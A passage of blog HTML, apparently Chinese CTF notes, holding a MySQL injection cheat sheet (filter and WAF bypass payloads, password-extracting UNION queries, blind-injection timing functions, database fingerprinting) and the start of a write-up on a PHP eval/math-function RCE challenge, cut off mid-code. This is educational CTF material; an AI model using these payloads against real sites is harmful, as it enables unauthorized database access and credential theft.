class="number">1</span>#</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27; or 2&gt;1#&#x27;</span>;</span><br></pre></td></tr></table></figure></div><h4 id="多种注释符"><a href="#多种注释符" class="headerlink" title="多种注释符"></a>多种注释符</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="comment">--%20</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">--+</span></span><br><span class="line"><span class="comment">-- -</span></span><br><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line">;</span><br><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br><span class="line">;\x00</span><br></pre></td></tr></table></figure></div><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><ul><li><p>大小写绕过</p></li><li><p>双写绕过（主要用于源码中使用replace替换黑名单）</p></li><li><p>编码绕过</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">一些unicode编码举例：    </span><br><span class="line">单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">%u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">%u02c8 %u2032</span></span><br><span class="line"><span class="string">%uff07 %c0%27</span></span><br><span class="line"><span class="string">%c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string">空白：</span></span><br><span class="line"><span class="string">%u0020 %uff00</span></span><br><span class="line"><span class="string">%c0%20 %c0%a0 %e0%80%a0</span></span><br><span class="line"><span class="string">左括号(:</span></span><br><span class="line"><span class="string">%u0028 %uff08</span></span><br><span class="line"><span class="string">%c0%28 %c0%a8</span></span><br><span class="line"><span class="string">%e0%80%a8</span></span><br><span class="line"><span class="string">右括号):</span></span><br><span class="line"><span class="string">%u0029 %uff09</span></span><br><span class="line"><span class="string">%c0%29 %c0%a9</span></span><br><span class="line"><span class="string">%e0%80%a9</span></span><br></pre></td></tr></table></figure></div></li><li><p>like绕过</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>#</span><br><span class="line">可绕过对<span class="operator">=</span> <span class="operator">&gt;</span>等过滤</span><br></pre></td></tr></table></figure></div></li><li><p>in绕过</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> (<span class="string">&#x27;1234&#x27;</span>)#</span><br></pre></td></tr></table></figure></div><blockquote><p>in可以代替’&#x3D;’，只有两个字符串一模一样时才返回true，注意括号不能漏，否则报错</p></blockquote></li><li><p>过滤union</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf<span class="operator">=</span> <span class="string">&#x27;and|or|union&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span><span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤where</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤limit</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admim</span><br></pre></td></tr></table></figure></div></li><li><p>过滤group by</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤select</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select&#x27;</span></span><br><span class="line">只能查询本表中的数据</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote></li><li><p>过滤’(单引号)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤hex</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="string">&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤substr</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="operator">|</span>substr<span class="string">&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>过滤逗号</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤了逗号怎么办？就不能多个参数了吗？</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);与<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>);</span><br><span class="line">意思相同</span><br><span class="line">substr支持这样的语法：</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos <span class="keyword">FOR</span> len)</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos)</span><br><span class="line">MID()后续加入了这种写法</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"> </span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"> </span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></div><h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `version()`  可以用来过空格和正则，特殊情况下还可以当作注释符用</span><br></pre></td></tr></table></figure></div><h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h3 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h3><p>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，<a class="link"   href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020" >PostgreSQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>java：Oracle，MySQL</p><h2 id="根据特有函数判断"><a href="#根据特有函数判断" class="headerlink" title="根据特有函数判断"></a>根据特有函数判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p><code>len()</code>：SQL Server 、MySQL以及db2返回长度的函数。<br><code>length()</code>：Oracle和INFORMIX返回长度的函数。</p><h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><code>version()</code>：MySQL查询版本信息的函数<br><code>@@version</code>：MySQL和SQL Server查询版本信息的函数</p><h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p><h3 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h3><p>&#x2F;*是MySQL数据库的注释符<br>–是Oracle和SQL Server支持的注释符<br>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外MySQL也支持– 和&#x2F;**&#x2F;</p><h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>MySQL<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’+’b’&#x3D;’ab’<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>Oracle<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’||’b’&#x3D;’ab’<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>SQL Server<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’+’b’&#x3D;’ab’ </p><h3 id="根据数据库特有的数据表来判断"><a href="#根据数据库特有的数据表来判断" class="headerlink" title="根据数据库特有的数据表来判断"></a>根据数据库特有的数据表来判断</h3><p>MySQL（version&gt;5.0）</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><p>Oracle</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><p>SQL Server</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><h3 id="根据盲注特别函数判断"><a href="#根据盲注特别函数判断" class="headerlink" title="根据盲注特别函数判断"></a>根据盲注特别函数判断</h3><p>MySQL</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(1000000,ENCODE(&#x27;QWE&#x27;,&#x27;ASD&#x27;))</span><br><span class="line">SLEEP(5)</span><br></pre></td></tr></table></figure></div><p>PostgreSQL</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PG_SLEEP(5)</span><br><span class="line">GENERATE_SERIES(1,1000000)</span><br></pre></td></tr></table></figure></div><p>SQL Server</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure></div><p>⚠️待补充 <a class="link"   href="https://www.freebuf.com/articles/web/261524.html" >珂技系列之一篇就够了——mysql注入 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[对MYSQL注入相关内容及部分Trick的归类小结 - 先知社区 (aliyun.com)](</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php利用math函数rce相关思考与理解</title>
      <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="php利用math函数rce相关思考与理解"><a href="#php利用math函数rce相关思考与理解" class="headerlink" title="php利用math函数rce相关思考与理解"></a>php利用math函数rce相关思考与理解</h1><h2 id="0x00题目背景"><a href="#0x00题目背景" class="headerlink" title="0x00题目背景"></a>0x00题目背景</h2><p>来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同</p><h3 id="相关过滤"><a href="#相关过滤" class="headerlink" title="相关过滤"></a>相关过滤</h3><p>长度限制</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;<span class="comment">//国赛限制80</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>黑名单特殊字符</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>白名单函数（都为math函数）</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  <span class="comment">//提取payload中函数名及变量名</span></span><br></pre></td></tr></table></figure></div><blockquote><p>php参考手册中提到，用于匹配php有效变量名，可以使用正则<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> 因此payload中若使用变量，命名必须在白名单函数中选择,如果是数组索引也可以用纯数字(不符合变量名命名法则)</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p>eval函数参数若是字符串，必须符合php代码语法，因此可以插入多行代码</p></blockquote><h2 id="0x01-利用math函数构造函数名"><a href="#0x01-利用math函数构造函数名" class="headerlink" title="0x01 利用math函数构造函数名"></a>0x01 利用math函数构造函数名</h2><h3 id="进制转换–获取小写字母"><a href="#进制转换–获取小写字母" class="headerlink" title="进制转换–获取小写字母"></a>进制转换–获取小写字母</h3><p>利用到进制转换，从11进制到36进制均有小写字母，在保证转换结果简洁及纯数字的情况下，选择36进制转10进制(36进制含a-z)</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先反向</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;cat&quot;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//15941</span></span><br><span class="line"><span class="comment">//这样就可以用纯数字通过三十六进制转换得到纯字母字符串了</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>);<span class="comment">//cat</span></span><br></pre></td></tr></table></figure></div><h3 id="字符串异或–获取特殊字符及其组合"><a href="#字符串异或–获取特殊字符及其组合" class="headerlink" title="字符串异或–获取特殊字符及其组合"></a>字符串异或–获取特殊字符及其组合</h3><h4 id="异或性质"><a href="#异或性质" class="headerlink" title="异或性质"></a>异或性质</h4><ol><li>结合律a ^ b ^ c &#x3D; a ^ c ^ b</li><li>交换律a ^ b &#x3D; b ^ a</li><li>数值交换（能交换 a 与 b 的值）a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="php字符串异或分为两种情况"><a href="#php字符串异或分为两种情况" class="headerlink" title="php字符串异或分为两种情况"></a>php字符串异或分为两种情况</h4><ul><li><p>长度一致的字符串异或，对应字符各自转换成ascii码值异或后得到新字符，组成新字符串</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;tan&quot;</span>^<span class="string">&quot;*\/&quot;</span>;<span class="comment">//^=A</span></span><br></pre></td></tr></table></figure></div></li><li><p>长度不一致的字符串异或，按最短的字符串长度按位异或</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;tan&quot;</span>^<span class="string">&quot;*&quot;</span>;<span 